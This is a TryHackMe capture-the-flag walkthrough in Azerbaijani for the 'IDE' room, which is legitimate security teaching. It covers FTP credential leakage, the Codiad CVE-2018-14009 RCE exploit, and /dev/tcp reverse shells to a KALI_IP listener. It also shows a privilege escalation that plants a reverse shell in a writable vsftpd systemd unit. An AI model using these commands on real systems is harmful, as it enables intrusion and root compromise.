# TryHackMe — IDE Writeup

**Room:** https://tryhackme.com/room/ide  
**Çətinlik:** Easy  
**OS:** Linux  

---

## 1. Reconnaissance

```bash
nmap -sV -sC -p- 10.80.131.194 --open
```

### Açıq Portlar

| Port  | Servis  | Qeyd                  |
|-------|---------|-----------------------|
| 21    | FTP     | Anonymous login icazəli |
| 22    | SSH     | OpenSSH               |
| 80    | HTTP    | Apache                |
| 62337 | HTTP    | Codiad Web IDE        |

---

## 2. FTP Enumeration

Anonymous login icazəli olduğundan birbaşa daxil oluruq:

```bash
ftp 10.80.131.194
# Username: anonymous
# Password: (boş, Enter bas)
```

```bash
ls -la
cd ...
ls -la
get -
```

`-` adlı faylı yükləyib oxuyuruq:

```bash
cat -
# və ya
mv - ftp_file
cat ftp_file
```

**Nəticə:**
- İstifadəçi adı: `john`
- Şifrə: default şifrə (`password`)
- Drac-dan John-a yazılmış mesaj tapılır

---

## 3. Codiad Web IDE — Initial Access

Brauzerdə aç:
```
http://10.80.131.194:62337
```

Credentials ilə daxil ol:
- **Username:** john
- **Password:** password

---

## 4. Remote Code Execution (CVE-2018-14009)

Exploit-DB: https://www.exploit-db.com/exploits/49705

```bash
wget https://www.exploit-db.com/raw/49705 -O codiad_rce.py
```

Exploit kodunda URL bug-ı düzəlt:

```bash
sed -i 's|url = domain + "components/filemanager/|url = domain + "/components/filemanager/|g' codiad_rce.py
```

**Terminal 1 — Listener 1:**
```bash
echo 'bash -c "bash -i >/dev/tcp/KALI_IP/4445 0>&1 2>&1"' | nc -lnvp 4444
```

**Terminal 2 — Listener 2:**
```bash
nc -lnvp 4445
```

**Terminal 3 — Exploit:**
```bash
python3 codiad_rce.py \
  http://10.80.131.194:62337/ \
  john \
  password \
  KALI_IP \
  4444 \
  linux
```

Shell gəldikdən sonra TTY yaxşılaşdır:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## 5. User Flag

```bash
cd /home
ls
cd drac
cat user.txt
```

**User Flag:** `ce258cb16f47f1c66f0b0b77f4e0fb8d`

---

## 6. Privilege Escalation

### Sudo İcazələrini Yoxla

```bash
sudo -l
```

**Nəticə:**
```
(ALL : ALL) /usr/sbin/service vsftpd restart
```

### Bash History-dən Credentials Tap

```bash
cat /home/drac/.bash_history
```

**Nəticə:**
```
mysql -u drac -p 'Th3dRaCULa1sR3aL'
```

### vsftpd.service Faylının İcazələrini Yoxla

```bash
ls -la /lib/systemd/system/vsftpd.service
```

**Nəticə:**
```
-rw-rw-r-- 1 root drac 248 Aug 4 2021 /lib/systemd/system/vsftpd.service
```

`drac` istifadəçisi bu faylı **yaza bilir!**

### Servis Faylını Dəyişdir

```bash
cat > /lib/systemd/system/vsftpd.service << 'EOF'
[Unit]
Description=vsftpd FTP server
After=network.target
[Service]
Type=simple
ExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/KALI_IP/9001 0>&1'
ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf
ExecReload=/bin/kill -HUP $MAINPID
ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty
[Install]
WantedBy=multi-user.target
EOF
```

### Kali-də Listener Aç

```bash
nc -lnvp 9001
```

### Servisi Restart Et

```bash
sudo /usr/sbin/service vsftpd restart
```

Root shell gəlir!

---

## 7. Root Flag

```bash
cat /root/root.txt
```

---

## 8. Vulnerability Summary

| Vulnerability | Təsvir |
|---------------|--------|
| FTP Anonymous Login | Credentials sızması |
| Codiad CVE-2018-14009 | Authenticated RCE |
| Bash History | Plaintext password |
| vsftpd.service yazılabilən | Privilege Escalation |

---

## 9. Öyrənilən Dərslər

- FTP Anonymous login həmişə yoxlanılmalıdır
- Bash history credentials sızdıra bilər
- Systemd servis fayllarının icazələri diqqətlə idarə edilməlidir
- `sudo -l` privilege escalation üçün ilk addımdır

---

## 10. Alətlər

- `nmap`
- `ftp`
- `python3` (exploit)
- `netcat`
- `linPEAS` (optional)
